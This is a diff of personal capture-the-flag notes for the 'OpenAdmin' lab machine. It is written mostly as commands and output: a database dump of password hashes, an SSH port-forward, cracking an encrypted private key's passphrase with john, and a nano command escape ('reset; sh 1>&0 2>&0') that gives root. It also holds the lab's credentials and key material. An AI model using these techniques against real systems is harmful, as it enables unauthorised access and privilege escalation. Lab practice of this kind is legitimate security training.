@@ -69,61 +69,148 @@ $ona_contexts=array (
   ),
 );
 
-www-data@openadmin:/opt/ona/www$ mysql -u ona_sys -p
-mysql -u ona_sys -p
-Enter password: n1nj4W4rri0R!
-use ona_default
-show tables;
-select *;
-ERROR 1096 (HY000) at line 3: No tables used
-Tables_in_ona_default
-blocks
-configuration_types
-configurations
-custom_attribute_types
-custom_attributes
-dcm_module_list
-device_types
-devices
-dhcp_failover_groups
-dhcp_option_entries
-dhcp_options
-dhcp_pools
-dhcp_server_subnets
-dns
-dns_server_domains
-dns_views
-domains
-group_assignments
-groups
-host_roles
-hosts
-interface_clusters
-interfaces
-locations
-manufacturers
-messages
-models
-ona_logs
-permission_assignments
-permissions
-roles
-sequences
-sessions
-subnet_types
-subnets
-sys_config
-tags
-users
-vlan_campuses
-vlans
 
-select * from users;
-use users;
-ERROR 1044 (42000) at line 3: Access denied for user 'ona_sys'@'localhost' to database 'users'
-id	username	password	level	ctime	atime
-1	guest	098f6bcd4621d373cade4e832627b4f6	0	2025-10-28 08:51:39	2025-10-28 08:51:39
-2	admin	21232f297a57a5a743894a0e4a801fc3	0	2007-10-30 03:00:17	2007-12-02 22:10:26
 
-admin //passwd
+//try the passwd as user pass 
+
+jimmy@openadmin:/tmp$ cd /var/www/internal/
+jimmy@openadmin:/var/www/internal$ ls
+index.php  logout.php  main.php
+jimmy@openadmin:/var/www/internal$ ls -la
+total 20
+drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
+drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
+-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
+-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
+-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
+
+
+jimmy@openadmin:/var/www/internal$ cat index.php
+<?php
+   ob_start();
+   session_start();
+?>
+              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
+                  $_SESSION['username'] = 'jimmy';
+                  header("Location: /main.php");
+              } else {
+                  $msg = 'Wrong username or password.';
+              }
+            }
+         ?>
+
+//this hash crack as 'reveal' hash256
+
+jimmy@openadmin:/var/www/internal$ netstat -ntlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22       
+//port 52846 is open
+
+jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846
+
+<?
+   // error_reporting(E_ALL);
+   // ini_set("display_errors", 1);
+?>
+
+<html lang = "en">
+
+   <head>
+      <title>Tutorialspoint.com</title>
+      <link href = "css/bootstrap.min.css" rel = "stylesheet">
+
+      <style>
+         body {
+            padding-top: 40px;
+            padding-bottom: 40px;
+            background-color: #ADABAB;
+//this is the page of index.php under internal
+
+//port forwarding this port to kali, for us access this page locally
+
+└─$ ssh -L 52846:localhost:52846 jimmy@10.10.10.171
+jimmy@10.10.10.171's password: 
+
+
+http://127.0.0.1:52846/main.php //requered user joanna and the passwd
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+Don't forget your "ninja" password
+Click here to logout Session
+
+
+┌──(ed㉿kali)-[/tmp]
+└─$ ssh joanna@10.10.10.171 -i id_rsa 
+Enter passphrase for key 'id_rsa': 
+joanna@10.10.10.171's password: 
+
+                                                                                                    
+┌──(ed㉿kali)-[/tmp]
+└─$ ssh2john id_rsa > ssh.john                 
+                                                                                                    
+┌──(ed㉿kali)-[/tmp]
+└─$ john --wordlist=~/oscp/rockyou.txt ssh.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bloodninjas      (id_rsa)     
+1g 0:00:00:02 DONE (2025-10-28 23:56) 0.3802g/s 3640Kp/s 3640Kc/s 3640KC/s bloodninjas..bloodmabite
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+└─$ ssh joanna@10.10.10.171 -i id_rsa          
+Enter passphrase for key 'id_rsa': 
+
+joanna@openadmin:~$ id
+uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
+
+Command to execute: reset; sh 1>&0 2>&0# id                                                         
+uid=0(root) gid=0(root) groups=0(root)            ^X Read File
+# cd root                                         M-F New Buffer
+# pwd
+/root
+# ls
+root.txt
+# cat root.txt
 
